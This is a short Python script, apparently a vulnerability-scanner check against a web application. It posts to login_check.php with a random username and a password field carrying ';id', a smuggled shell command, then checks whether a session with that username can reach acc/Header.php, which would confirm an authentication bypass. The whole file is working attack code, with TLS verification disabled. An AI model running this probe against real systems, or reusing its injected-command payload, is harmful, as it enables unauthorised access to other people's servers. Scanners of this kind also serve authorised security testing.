import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
tmp_cookie=randomLowercase(26)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
tmp_username=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login_check.php"
	body="userName="+tmp_username+"&password=%3Bid&x=0&y=0"
	headers={'Cookie': 'PHPSESSID='+tmp_cookie, 'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 302 and response.headers["location"] == "redirect.php":
				f_list.append(1)
				break
		if len(f_list)>0:
			r0=True
		else:
			r0=False
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"acc/Header.php"
	headers={'Cookie': 'PHPSESSID='+tmp_cookie}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and tmp_username in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
